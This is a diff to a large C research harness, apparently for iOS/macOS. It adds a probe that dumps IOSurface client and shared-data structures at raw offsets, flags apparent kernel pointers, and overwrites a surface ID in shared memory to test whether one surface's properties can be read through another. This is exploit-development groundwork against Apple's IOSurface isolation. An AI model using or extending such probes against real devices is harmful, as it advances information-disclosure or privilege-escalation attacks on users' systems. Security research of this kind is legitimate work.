@@ -16721,6 +16721,219 @@ static void r428_sighandler(int sig) {
     siglongjmp(g_r428_jmp, 1);
 }
 
+/*
+ * r429: Deep analysis of IOSurface shared data pointer targets.
+ *
+ * r428 showed +112/+120/+128 are userspace pointers not used by kernel.
+ * Now dump what they point to and find what the library does with them.
+ * Also try: modify the surface ID at +136 to point to another surface,
+ * then call IOSurfaceCopyValue — if the library uses +136 for the kernel
+ * trap, we can read properties from other surfaces (cross-surface read).
+ *
+ * Also scan the entire IOSurfaceClientRef structure (448 bytes at the
+ * surf pointer itself) for any kernel pointers or interesting data.
+ */
+
+static void r429_probe(void) {
+    rlog("\n=== r429: Shared Data Target Analysis ===\n\n");
+    fflush(stdout);
+
+    unsigned pixFmt = 'BGRA';
+    const void *kk[] = {
+        kIOSurfaceWidth, kIOSurfaceHeight,
+        kIOSurfaceBytesPerRow, kIOSurfacePixelFormat,
+        kIOSurfaceAllocSize
+    };
+    int w = 64, h = 64, bpr = 256, as = 16384;
+    CFNumberRef vv[] = {
+        CFNumberCreate(NULL, kCFNumberIntType, &w),
+        CFNumberCreate(NULL, kCFNumberIntType, &h),
+        CFNumberCreate(NULL, kCFNumberIntType, &bpr),
+        CFNumberCreate(NULL, kCFNumberIntType, &pixFmt),
+        CFNumberCreate(NULL, kCFNumberIntType, &as)
+    };
+    CFDictionaryRef sprops = CFDictionaryCreate(NULL, kk,
+        (const void**)vv, 5,
+        &kCFTypeDictionaryKeyCallBacks,
+        &kCFTypeDictionaryValueCallBacks);
+
+    IOSurfaceRef surf1 = IOSurfaceCreate(sprops);
+    IOSurfaceRef surf2 = IOSurfaceCreate(sprops);
+    uint32_t sid1 = IOSurfaceGetID(surf1);
+    uint32_t sid2 = IOSurfaceGetID(surf2);
+
+    uint64_t clientRef1 = (uint64_t)surf1;
+    uint64_t sharedPtr1;
+    memcpy(&sharedPtr1, (void *)(clientRef1 + 8), 8);
+
+    uint64_t clientRef2 = (uint64_t)surf2;
+    uint64_t sharedPtr2;
+    memcpy(&sharedPtr2, (void *)(clientRef2 + 8), 8);
+
+    rlog("    Surface 1: id=%u shared=0x%llx client=0x%llx\n",
+        sid1, (unsigned long long)sharedPtr1,
+        (unsigned long long)clientRef1);
+    rlog("    Surface 2: id=%u shared=0x%llx client=0x%llx\n",
+        sid2, (unsigned long long)sharedPtr2,
+        (unsigned long long)clientRef2);
+
+    /* ---- Phase 1: Dump what +120 and +128 point to ---- */
+    rlog("\n  Phase 1: Structures at +120 and +128\n");
+    {
+        uint64_t ptr120, ptr128;
+        memcpy(&ptr120, (void *)(sharedPtr1 + 120), 8);
+        memcpy(&ptr128, (void *)(sharedPtr1 + 128), 8);
+
+        rlog("    +120 target (0x%llx):\n",
+            (unsigned long long)ptr120);
+        if (ptr120) {
+            vm_offset_t data = 0;
+            mach_msg_type_number_t cnt = 0;
+            kern_return_t kr = vm_read(mach_task_self(),
+                (vm_address_t)ptr120, 256, &data, &cnt);
+            if (kr == KERN_SUCCESS) {
+                uint64_t *p = (uint64_t *)data;
+                for (int off = 0; off < 256; off += 8) {
+                    uint64_t v = p[off / 8];
+                    if (v != 0) {
+                        rlog("      +%3d: 0x%016llx", off,
+                            (unsigned long long)v);
+                        if ((v >> 32) >= 0xFFFFFFF0ULL)
+                            rlog(" ***KERN***");
+                        rlog("\n");
+                    }
+                }
+                vm_deallocate(mach_task_self(), data, cnt);
+            } else {
+                rlog("      vm_read failed kr=%d\n", kr);
+            }
+        }
+
+        rlog("    +128 target (0x%llx):\n",
+            (unsigned long long)ptr128);
+        if (ptr128) {
+            vm_offset_t data = 0;
+            mach_msg_type_number_t cnt = 0;
+            kern_return_t kr = vm_read(mach_task_self(),
+                (vm_address_t)ptr128, 256, &data, &cnt);
+            if (kr == KERN_SUCCESS) {
+                uint64_t *p = (uint64_t *)data;
+                for (int off = 0; off < 256; off += 8) {
+                    uint64_t v = p[off / 8];
+                    if (v != 0) {
+                        rlog("      +%3d: 0x%016llx", off,
+                            (unsigned long long)v);
+                        if ((v >> 32) >= 0xFFFFFFF0ULL)
+                            rlog(" ***KERN***");
+                        rlog("\n");
+                    }
+                }
+                vm_deallocate(mach_task_self(), data, cnt);
+            } else {
+                rlog("      vm_read failed kr=%d\n", kr);
+            }
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Phase 2: Full IOSurfaceClientRef dump (448 bytes) ---- */
+    rlog("\n  Phase 2: IOSurfaceClientRef (448 bytes at surf ptr)\n");
+    {
+        vm_offset_t data = 0;
+        mach_msg_type_number_t cnt = 0;
+        kern_return_t kr = vm_read(mach_task_self(),
+            (vm_address_t)clientRef1, 448, &data, &cnt);
+        if (kr == KERN_SUCCESS) {
+            uint64_t *p = (uint64_t *)data;
+            for (int off = 0; off < 448; off += 8) {
+                uint64_t v = p[off / 8];
+                if (v != 0) {
+                    rlog("    +%3d: 0x%016llx", off,
+                        (unsigned long long)v);
+                    if (off == 0) rlog(" [isa PAC-signed]");
+                    else if (off == 8) rlog(" [shared ptr]");
+                    else if (off >= 16 && off < 40) {
+                        char c[9];
+                        memcpy(c, &v, 8);
+                        c[8] = 0;
+                        int printable = 1;
+                        for (int j = 0; j < 8 && c[j]; j++) {
+                            if (c[j] < 0x20 || c[j] > 0x7e) {
+                                printable = 0;
+                                break;
+                            }
+                        }
+                        if (printable && c[0])
+                            rlog(" [bundleID: '%.8s']", c);
+                    }
+                    if ((v >> 32) >= 0xFFFFFFF0ULL)
+                        rlog(" ***KERN***");
+                    rlog("\n");
+                }
+            }
+            vm_deallocate(mach_task_self(), data, cnt);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Phase 3: Surface ID swap test ---- */
+    rlog("\n  Phase 3: Surface ID swap at +136\n");
+    {
+        /* Set a property on surf2 only */
+        CFStringRef secretKey = CFSTR("secret_prop");
+        int secretVal = 77777;
+        CFNumberRef sn = CFNumberCreate(NULL, kCFNumberIntType,
+            &secretVal);
+        IOSurfaceSetValue(surf2, secretKey, sn);
+        CFRelease(sn);
+        rlog("    Set 'secret_prop'=77777 on surface %u\n", sid2);
+
+        /* Read +136 from surf1's shared data */
+        uint64_t origSid;
+        memcpy(&origSid, (void *)(sharedPtr1 + 136), 8);
+        rlog("    surf1 +136 (original): 0x%llx (sid=%u)\n",
+            (unsigned long long)origSid, (uint32_t)origSid);
+
+        /* Swap surf1's sid to surf2's */
+        uint64_t fakeSid = sid2;
+        memcpy((void *)(sharedPtr1 + 136), &fakeSid, 8);
+        rlog("    surf1 +136 (swapped): 0x%llx (sid=%u)\n",
+            (unsigned long long)fakeSid, (uint32_t)fakeSid);
+
+        /* Now try to read surf2's property through surf1 */
+        CFNumberRef readBack = (CFNumberRef)IOSurfaceCopyValue(surf1,
+            secretKey);
+        if (readBack) {
+            int rb = 0;
+            CFNumberGetValue(readBack, kCFNumberIntType, &rb);
+            rlog("    *** READ VIA SURF1: %d (expected 77777) ***\n", rb);
+            if (rb == 77777) {
+                rlog("    *** CROSS-SURFACE READ VIA SID SWAP WORKS! ***\n");
+            }
+            CFRelease(readBack);
+        } else {
+            rlog("    Read via surf1 returned NULL\n");
+        }
+
+        /* Restore */
+        memcpy((void *)(sharedPtr1 + 136), &origSid, 8);
+
+        /* Also check: does IOSurfaceGetID use the shared data? */
+        uint32_t reportedId = IOSurfaceGetID(surf1);
+        rlog("    IOSurfaceGetID(surf1) = %u (expected %u)\n",
+            reportedId, sid1);
+    }
+    fflush(stdout);
+
+    CFRelease(surf1);
+    CFRelease(surf2);
+    CFRelease(sprops);
+    for (int i = 0; i < 5; i++) CFRelease(vv[i]);
+
+    rlog("\n=== r429 complete ===\n");
+    fflush(stdout);
+}
+
 static void r428_probe(void) {
     rlog("\n=== r428: Shared Data Pointer Redirect ===\n\n");
     fflush(stdout);
@@ -73505,6 +73718,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 432) {
+            rlog("*** rounds=432: Shared Data Target Analysis + SID Swap ***\n");
+            rlog("  Dump +120/+128 targets, full ClientRef, surface ID swap test.\n\n");
+            fflush(stdout);
+            r429_probe();
+            goto done;
+        }
         if (rounds == 431) {
             rlog("*** rounds=431: Shared Data Pointer Redirect ***\n");
             rlog("  Test kernel reads of shared data pointer fields +112/+120/+128.\n\n");
@@ -76114,7 +76334,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
